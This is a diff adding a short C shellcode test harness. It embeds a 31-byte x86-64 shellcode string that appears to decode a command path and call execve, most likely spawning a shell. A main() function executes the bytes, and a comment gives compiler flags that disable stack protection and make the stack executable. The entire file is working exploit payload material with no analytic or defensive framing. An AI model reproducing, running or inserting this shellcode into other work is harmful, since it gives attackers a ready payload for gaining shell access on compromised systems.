@@ -1,0 +1,9 @@
+#include<stdio.h>
+//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+unsigned char code[] = "\xf7\xe6\x52\xb0\x01\x48\xbb\xdc\x5e\x5e\xe6\xd0\x5e\xc4\xd2\x48\xc1\xc3\x18\x48\xd1\xeb\x53\x48\x8d\x3c\x24\x04\x3a\x0f\x05";
+  
+main()
+{
+   int (*ret)()=(int(*)()) code;
+    ret();
+}
